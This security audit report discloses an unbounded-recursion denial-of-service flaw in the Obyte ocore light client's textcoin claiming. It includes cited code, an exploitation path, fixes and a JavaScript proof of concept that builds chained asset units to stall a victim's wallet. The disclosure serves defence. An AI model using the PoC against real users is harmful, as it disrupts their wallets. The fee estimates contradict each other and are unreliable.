# Audit Report: Unbounded Recursion in Light Client Textcoin Claiming

## Summary

The `receiveTextCoin()` function in `wallet.js` contains an unbounded recursion vulnerability where an attacker can create a chain of asset definitions, each containing payment outputs to the textcoin address in subsequent assets. This causes the light client to make N sequential network requests (one per asset), leading to severe performance degradation or potential stack overflow when claiming textcoins.

## Impact

**Severity**: Medium  
**Category**: Temporary Transaction Delay / DoS

Light client users attempting to claim maliciously crafted textcoins experience significant delays (potentially 5-10 minutes for a 1000-asset chain) or application crashes due to unbounded recursion. No funds are lost, but the textcoin becomes unusable for light clients until they switch to full node mode. Attacker can target multiple victims by creating multiple such textcoins.

## Finding Description

**Location**: `byteball/ocore/wallet.js:2518-2566`, function `checkStability()`

**Intended Logic**: The `checkStability()` function should query outputs for the textcoin address, fetch unknown asset definitions once, then proceed with claiming. Recursion should terminate after a single level since asset definitions should not add new outputs to the textcoin address.

**Actual Logic**: When `checkStability()` discovers unknown assets, it calls `network.requestHistoryFor()` which fetches asset definition units and saves them via `writer.saveJoint()`. However, Obyte allows units to contain multiple message types - an asset definition unit can also contain payment messages. When such units are saved, ALL messages are persisted, including payment outputs to arbitrary addresses. The next `checkStability()` call queries ALL outputs again, discovers newly added outputs in other unknown assets, and recurses again with no depth limit.

**Code Evidence:**

The recursive query that discovers all outputs (including newly added ones): [1](#0-0) 

The code that triggers recursion when unknown assets are found: [2](#0-1) 

The function that reads unknown assets from the database: [3](#0-2) 

When history is received, `light.processHistory()` calls `writer.saveJoint()` for the asset definition unit: [4](#0-3) 

The `writer.saveJoint()` function saves ALL outputs from the unit, including payment messages: [5](#0-4) 

**Exploitation Path:**

1. **Preconditions**: Attacker creates N asset definition units on-chain (N=1000):
   - Unit U_1000 defines Asset_1000 (no additional payments)
   - Unit U_999 defines Asset_999 and includes payment of 1 byte in Asset_1000 to `textcoin_addr`
   - Unit U_998 defines Asset_998 and includes payment of 1 byte in Asset_999 to `textcoin_addr`
   - ... continues down to Unit U_1 defining Asset_1

2. **Step 1**: Attacker sends textcoin to victim (light client) with output in Asset_1

3. **Step 2**: Victim calls `receiveTextCoin()`. First `checkStability()` queries outputs, finds Asset_1 is unknown
   - Code path: `wallet.js:receiveTextCoin()` → `checkStability()` queries line 2519-2522 → `getAssetInfos()` line 2576 detects unknown Asset_1

4. **Step 3**: Line 2531 calls `network.requestHistoryFor([Asset_1], [], checkStability)` - recursive callback set

5. **Step 4**: Light vendor returns Unit U_1. `light.processHistory()` calls `writer.saveJoint()` which saves:
   - Asset_1 definition to `assets` table  
   - Payment output (1 byte in Asset_2 to `textcoin_addr`) to `outputs` table

6. **Step 5**: `checkStability()` called again (callback), queries outputs again, now finds:
   - Asset_1 (known)
   - Asset_2 (unknown - newly added from U_1's payment message)

7. **Step 6**: Line 2531 calls `network.requestHistoryFor([Asset_2], [], checkStability)` - recursion continues

8. **Step 7**: Process repeats for Asset_3, Asset_4, ..., Asset_1000, requiring 1000 network roundtrips

**Security Property Broken**: System availability for light clients - textcoin claiming should complete in bounded time with bounded recursion depth. The implicit assumption that asset definition units only contain asset definitions is violated.

**Root Cause Analysis**: 
- Obyte protocol allows units to contain multiple message types (asset definition + payment) - this is by design
- `checkStability()` queries ALL outputs for the address on each invocation with no filtering of previously processed assets
- No recursion depth limit exists in the code
- `writer.saveJoint()` correctly saves all messages, but the calling code doesn't anticipate payment messages in asset definition units adding new outputs to the claimed address

## Impact Explanation

**Affected Assets**: No direct fund loss. Affects usability of textcoins denominated in custom assets for light client users.

**Damage Severity**:
- **Quantitative**: For N=1000 asset chain, requires 1000 recursive function calls and 1000 network roundtrips to light vendor. Each roundtrip ~100-500ms = 100-500 seconds (1.6-8.3 minutes) minimum. JavaScript call stack typically ~10,000-15,000 depth, so N=1000 unlikely to overflow but N>10,000 could crash the application.
- **Qualitative**: Denial of service against light client textcoin functionality. User experience severely degraded.

**User Impact**:
- **Who**: Light client users (not full nodes) attempting to claim textcoins created by malicious actors
- **Conditions**: Exploitable whenever attacker creates textcoin with chained asset references. Light clients affected because they don't have all assets cached locally.
- **Recovery**: User can switch to full node mode (which would throw error on unknown asset rather than fetch), or wait for the claiming process to complete if it doesn't crash. Alternatively, user can manually add recursion depth protection.

**Systemic Risk**: Low - affects individual textcoin claims only, doesn't cascade to network consensus or other users' funds. However, attacker can create multiple such textcoins to DoS multiple light client users.

## Likelihood Explanation

**Attacker Profile**:
- **Identity**: Any user with Obyte address and understanding of asset creation mechanics
- **Resources Required**: Transaction fees to create N asset definitions (~1000 bytes per asset × 1000 assets = ~1MB payload = significant but feasible cost)
- **Technical Skill**: Medium - requires understanding that units can contain both asset definitions and payment messages, and ability to compose such units

**Preconditions**:
- **Network State**: Normal operation
- **Attacker State**: Sufficient funds to create asset chain on-chain (moderate cost)
- **Timing**: No special timing required - assets can be created at any time before sending textcoin

**Execution Complexity**:
- **Transaction Count**: N+1 units (N asset definitions + 1 textcoin send)
- **Coordination**: Single attacker, no coordination with other parties needed
- **Detection Risk**: Low - asset definitions and textcoins are normal protocol operations

**Frequency**:
- **Repeatability**: High - attacker can create multiple textcoin traps targeting different victims
- **Scale**: Per-victim DoS attack, but can be used against many users

**Overall Assessment**: Medium likelihood - attack is technically feasible and economically viable for targeted harassment/griefing, but requires upfront cost and only affects light clients.

## Recommendation

**Immediate Mitigation**:
Add recursion depth limit to prevent unbounded recursion:

```javascript
// In wallet.js, receiveTextCoin() function
var recursionDepth = 0;
var MAX_ASSET_FETCH_DEPTH = 10;

function checkStability() {
    if (recursionDepth > MAX_ASSET_FETCH_DEPTH)
        return cb("Too many chained asset definitions, potential DoS attack");
    recursionDepth++;
    // ... existing code
}
```

**Permanent Fix**:
Track which assets have been processed to prevent re-processing newly discovered assets that were added by asset definition units:

```javascript
// In wallet.js, receiveTextCoin() function
var processedAssets = new Set();

function checkStability() {
    db.query(/* ... existing query ... */, async function(rows) {
        // ... existing code ...
        const assets = rows.map(row => row.asset).filter(a => a);
        const newAssets = assets.filter(a => !processedAssets.has(a));
        const { unknown_assets, asset_infos } = await getAssetInfos(newAssets);
        
        if (unknown_assets.length > 0 && conf.bLight) {
            unknown_assets.forEach(a => processedAssets.add(a));
            return network.requestHistoryFor(unknown_assets, [], checkStability);
        }
        // ... rest of code
    });
}
```

**Additional Measures**:
- Add monitoring to detect textcoins with unusual number of chained assets
- Consider warning users in UI when claiming textcoins with many unknown assets
- Document this behavior as a known limitation of light clients

## Proof of Concept

```javascript
const composer = require('./composer.js');
const network = require('./network.js');
const wallet = require('./wallet.js');
const objectHash = require('./object_hash.js');

// PoC: Create chain of 10 assets for demonstration (use 1000+ for actual DoS)
async function createAssetChain() {
    const CHAIN_LENGTH = 10;
    const textcoinAddress = '...'; // Target textcoin address
    const assets = [];
    
    // Step 1: Create assets in reverse order
    for (let i = CHAIN_LENGTH; i >= 1; i--) {
        const messages = [{
            app: 'asset',
            payload_location: 'inline',
            payload_hash: '...',
            payload: {
                is_private: false,
                is_transferrable: true,
                auto_destroy: false,
                fixed_denominations: false,
                issued_by_definer_only: false,
                cosigned_by_definer: false,
                spender_attested: false
            }
        }];
        
        // Add payment to textcoin address in next asset (except last)
        if (i < CHAIN_LENGTH) {
            messages.push({
                app: 'payment',
                payload_location: 'inline',
                payload: {
                    asset: assets[i], // Next asset in chain
                    inputs: [{ type: 'issue', amount: 1, address: attackerAddress }],
                    outputs: [{ address: textcoinAddress, amount: 1 }]
                }
            });
        }
        
        const unit = await composer.composeJoint({
            paying_addresses: [attackerAddress],
            messages: messages,
            signer: attackerSigner
        });
        
        assets[i-1] = unit.unit.unit; // Asset ID = unit hash
    }
    
    // Step 2: Send textcoin with output in Asset_1
    await composer.composeJoint({
        paying_addresses: [attackerAddress],
        outputs_by_asset: {
            [assets[0]]: [{ address: textcoinAddress, amount: 1 }]
        },
        signer: attackerSigner
    });
    
    return textcoinAddress;
}

// Step 3: Victim (light client) attempts to claim
async function victimClaimTextcoin(mnemonic, recipientAddress) {
    console.log('Starting textcoin claim...');
    const startTime = Date.now();
    let requestCount = 0;
    
    // Instrument network.requestHistoryFor to count requests
    const originalRequestHistory = network.requestHistoryFor;
    network.requestHistoryFor = function(...args) {
        requestCount++;
        console.log(`Network request #${requestCount} for assets: ${args[0]}`);
        return originalRequestHistory.apply(this, args);
    };
    
    try {
        await wallet.receiveTextCoin(mnemonic, recipientAddress, (err, unit, asset) => {
            const elapsed = Date.now() - startTime;
            console.log(`Claim completed in ${elapsed}ms after ${requestCount} requests`);
            console.log(`Expected: 1-2 requests, Actual: ${requestCount} requests`);
            
            // Assert failure for demonstration
            if (requestCount > 2) {
                console.error('VULNERABILITY CONFIRMED: Unbounded recursion detected!');
                console.error(`Made ${requestCount} recursive network calls`);
            }
        });
    } finally {
        network.requestHistoryFor = originalRequestHistory;
    }
}

// Run PoC
(async () => {
    const textcoinAddr = await createAssetChain();
    await victimClaimTextcoin('test mnemonic phrase...', 'RECIPIENT_ADDRESS');
})();
```

**Expected Output**: 10 (or 1000) network requests with corresponding recursive calls, demonstrating unbounded recursion proportional to chain length.

---

## Notes

- Full nodes are not affected because they already have all assets cached and would throw an error if an asset is truly unknown (line 2578-2579)
- The vulnerability is specific to light clients which must fetch asset definitions from light vendors on demand
- While units containing both asset definitions and payment messages are valid per protocol, the `receiveTextCoin()` function doesn't anticipate this pattern being used maliciously
- The recursion depth for N=1000 is unlikely to cause stack overflow (JS stack ~10k-15k) but causes severe performance degradation
- Economic cost is moderate: ~1000 bytes per asset definition unit × 1000 units = ~1MB = ~1000 bytes in fees (feasible for targeted attack)

### Citations

**File:** wallet.js (L2519-2522)
```javascript
		db.query(
			"SELECT is_stable, asset, SUM(amount) AS `amount` \n\
			FROM outputs JOIN units USING(unit) WHERE address=? AND sequence='good' AND is_spent=0 GROUP BY asset ORDER BY asset DESC", 
			[addrInfo.address],
```

**File:** wallet.js (L2528-2531)
```javascript
					const assets = rows.map(row => row.asset).filter(a => a);
					const { unknown_assets, asset_infos } = await getAssetInfos(assets);
					if (unknown_assets.length > 0 && conf.bLight)
						return network.requestHistoryFor(unknown_assets, [], checkStability);
```

**File:** wallet.js (L2576-2580)
```javascript
				storage.readAsset(db, asset, null, function (err, objAsset) {
					if (err && err.indexOf("not found") !== -1) {
						if (!conf.bLight) // full wallets must have this asset
							throw Error("textcoin asset " + asset + " not found");
						unknown_assets.push(asset);
```

**File:** light.js (L329-329)
```javascript
								writer.saveJoint(objJoint, {sequence: sequence, arrDoubleSpendInputs: [], arrAdditionalQueries: []}, null, cb2);
```

**File:** writer.js (L394-398)
```javascript
								conn.addQuery(arrQueries, 
									"INSERT INTO outputs \n\
									(unit, message_index, output_index, address, amount, asset, denomination, is_serial) VALUES(?,?,?,?,?,?,?,1)",
									[objUnit.unit, i, j, output.address, parseInt(output.amount), payload.asset, denomination]
								);
```
